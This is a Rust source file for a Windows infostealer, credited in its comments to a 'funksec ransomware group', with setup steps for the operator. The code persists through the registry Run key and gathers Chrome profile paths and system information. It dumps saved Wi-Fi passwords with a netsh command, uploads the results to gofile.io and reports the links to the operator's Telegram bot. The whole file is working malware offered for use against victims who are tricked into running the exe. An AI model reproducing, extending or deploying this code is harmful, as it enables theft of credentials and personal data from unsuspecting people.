// funksec team :
// this tool created by funksec team to help you steal any informations of target by send exe file and receive the data in telegram , the program will upload the data by write on CMD to extract wifi passwords and systeminfo to gofile , you will receive link in telegram BOT

// how to create bot :
// -- go to @BotFather , create bot
// -- copy token and replace in down script "yourBottoken"
// -- after this go to @userinfobot , press start
// -- copy the ID and replace in down script "yourtelegramID"
// -- go to home were cargo.toml file and write "cargo build --release"
// -- enjoy


// copyright by funksec ransomware group

// you can delete this content after read



use reqwest::blocking::Client;
use serde::Deserialize;
use std::{
    collections::HashSet,
    env,
    error::Error,
    fs::{self, read_dir, File},
    io::{self, Read, Write},
    path::{Path, PathBuf},
    process::Command,
};

#[derive(Deserialize)]
struct ServerResponse {
    data: ServerData,
}

#[derive(Deserialize)]
struct ServerData {
    servers: Vec<Server>,
}

#[derive(Deserialize)]
struct Server {
    name: String,
}

#[derive(Deserialize)]
struct UploadResponse {
    data: UploadData,
}

#[derive(Deserialize)]
struct UploadData {
    downloadPage: String,
}

fn send_telegram_message(bot_token: &str, chat_id: &str, message: &str) -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let url = format!("https://api.telegram.org/bot{}/sendMessage", bot_token);
    let params = [("chat_id", chat_id), ("text", message)];
    client.post(&url).form(&params).send()?;
    Ok(())
}

fn save_to_txt(file_name: &str, data: String) -> io::Result<()> {
    let mut file = File::create(file_name)?;
    file.write_all(data.as_bytes())?;
    Ok(())
}

fn get_sensitive_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    if let Ok(local_app_data) = env::var("LOCALAPPDATA") {
        let chrome_user_data = Path::new(&local_app_data).join("Google\\Chrome\\User Data");
        if chrome_user_data.exists() {
            let local_state = chrome_user_data.join("Local State");
            if local_state.exists() {
                paths.push(local_state);
            }

            if let Ok(entries) = read_dir(chrome_user_data) {
                for entry in entries.filter_map(|e| e.ok()) {
                    let entry_name = entry.file_name().to_string_lossy().into_owned();
                    if entry_name.starts_with("Default") || entry_name.starts_with("Profile ") {
                        let profile_path = entry.path();
                        let files_to_collect = vec![
                            "Login Data",
                            "Cookies",
                            "History",
                            "Web Data",
                            "Bookmarks",
                            "Preferences",
                            "Shortcuts",
                            "Top Sites",
                        ];
                        
                        for file in files_to_collect {
                            let file_path = profile_path.join(file);
                            if file_path.exists() {
                                paths.push(file_path);
                            }
                        }
                    }
                }
            }
        }
    }

    let system_files = vec![
        ("systeminfo", "systeminfo.txt"),
        ("ipconfig /all", "network_info.txt"),
        ("netstat -ano", "network_connections.txt"),
        ("tasklist", "processes.txt"),
        ("netsh wlan show profile name=* key=clear", "wifi_passwords.txt"),
        ("reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "startup_entries.txt"),
        ("wmic product get name,version", "installed_software.txt"),
    ];

    for (cmd, output_file) in system_files {
        let output_path = PathBuf::from(output_file);
        let _ = Command::new("cmd")
            .args(&["/C", &format!("{} > {}", cmd, output_file)])
            .status();
        if output_path.exists() {
            paths.push(output_path);
        }
    }

    paths
}

fn upload_file(client: &Client, server_name: &str, file_path: &Path) -> Result<String, Box<dyn Error>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let form = reqwest::blocking::multipart::Form::new()
        .part("file", reqwest::blocking::multipart::Part::bytes(buffer)
            .file_name(file_path.file_name().unwrap().to_str().unwrap().to_string()));

    let upload_url = format!("https://{}.gofile.io/uploadFile", server_name);
    let response: UploadResponse = client.post(&upload_url)
        .multipart(form)
        .send()?
        .json()?;

    Ok(response.data.downloadPage)
}

fn add_to_startup() -> Result<(), Box<dyn Error>> {
    let exe_path = env::current_exe()?.to_str().unwrap().to_string();
    let reg_add_command = format!(
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyApp /t REG_SZ /d \"{}\" /f", 
        exe_path
    );
    Command::new("cmd").args(&["/C", &reg_add_command]).output()?;
    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let _ = add_to_startup();

    let client = Client::new();
    let server_response: ServerResponse = client.get("https://api.gofile.io/servers")
        .send()?
        .json()?;
    let server_name = &server_response.data.servers[0].name;

    let sensitive_files = get_sensitive_paths();
    let generated_files: HashSet<&str> = [
        "systeminfo.txt", "network_info.txt", "network_connections.txt",
        "processes.txt", "wifi_passwords.txt", "startup_entries.txt",
        "installed_software.txt"
    ].iter().cloned().collect();

    for file_path in sensitive_files {
        if let Some(file_name) = file_path.file_name().and_then(|n| n.to_str()) {
            if !generated_files.contains(file_name) {
                let file_content = format!("Data from: {}", file_path.display());
                let txt_file_path = Path::new(file_name);
                save_to_txt(file_name, file_content)?;
            }

            if file_name.ends_with(".txt") {
                if let Ok(download_link) = upload_file(&client, server_name, &file_path) {
                    let _ = send_telegram_message(
                        "yourBottoken", //replace this with your BOT token
                        "yourtelegramID", //replace this with your telegram ID number
                        &format!("New file uploaded: {}", download_link)
                    );

                    // Cleanup temporary files
                    fs::remove_file(file_path)?;
                }
            }
        }
    }

    Ok(())
}
